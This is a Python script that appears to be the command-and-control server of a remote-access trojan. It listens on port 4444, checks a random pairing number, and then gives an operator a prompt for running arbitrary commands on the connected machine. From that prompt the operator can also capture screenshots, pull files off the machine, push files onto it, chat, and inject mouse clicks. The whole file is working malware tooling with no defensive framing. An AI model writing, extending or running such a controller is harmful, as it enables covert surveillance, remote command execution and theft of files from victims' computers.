import socket
import random
import os

HOST = '0.0.0.0'
PORT = 4444

executor_number = str(random.randint(1000, 9999))
print(f"[+] Executor number for client: {executor_number}")

server = socket.socket()
server.bind((HOST, PORT))
server.listen(1)

client, addr = server.accept()
print(f"[+] Connection from {addr}")

client_executor_number = client.recv(1024).decode()
if client_executor_number != executor_number:
    client.send(b'Invalid executor number')
    client.close()
    exit()
client.send(b'OK')

def receive_screenshot(sock):
    size = int(sock.recv(1024).decode())
    sock.send(b'OK')
    data = b''
    while len(data) < size:
        data += sock.recv(4096)
    with open("screenshot.png", "wb") as f:
        f.write(data)
    print("[+] Screenshot saved as screenshot.png")

def download_file(sock):
    filename = input("Filename to download from client: ")
    sock.send(filename.encode())
    size = int(sock.recv(1024).decode())
    if size == 0:
        print("[-] File not found on client.")
        return
    sock.send(b'OK')
    data = b''
    while len(data) < size:
        data += sock.recv(4096)
    with open("downloaded_" + os.path.basename(filename), "wb") as f:
        f.write(data)
    print("[+] File downloaded.")

def upload_file(sock):
    filename = input("Filename to upload to client: ")
    sock.send(filename.encode())
    with open(filename, 'rb') as f:
        data = f.read()
    sock.send(str(len(data)).encode())
    sock.recv(2)
    sock.send(data)
    print("[+] File sent.")

def chat(sock):
    print("Type 'exitchat' to end chat.")
    while True:
        msg = input("[You]: ")
        sock.send(msg.encode())
        if msg.lower() == 'exitchat':
            break
        reply = sock.recv(1024).decode()
        print(f"[Client]: {reply}")
        if reply.lower() == 'exitchat':
            break

def click(sock):
    x = input("X position: ")
    y = input("Y position: ")
    click_type = input("Click type (left/right): ")
    sock.send(x.encode())
    sock.recv(2)
    sock.send(y.encode())
    sock.recv(2)
    sock.send(click_type.encode())
    print(sock.recv(1024).decode())

while True:
    cmd = input("CMD> ")
    if cmd.lower() == 'exit':
        client.send(b'exit')
        break
    elif cmd == 'screenshot':
        client.send(b'screenshot')
        receive_screenshot(client)
    elif cmd == 'upload':
        client.send(b'upload')
        upload_file(client)
    elif cmd == 'download':
        client.send(b'download')
        download_file(client)
    elif cmd == 'chat':
        client.send(b'chat')
        chat(client)
    elif cmd == 'click':
        client.send(b'click')
        click(client)
    else:
        client.send(cmd.encode())
        print(client.recv(8192).decode())

client.close()
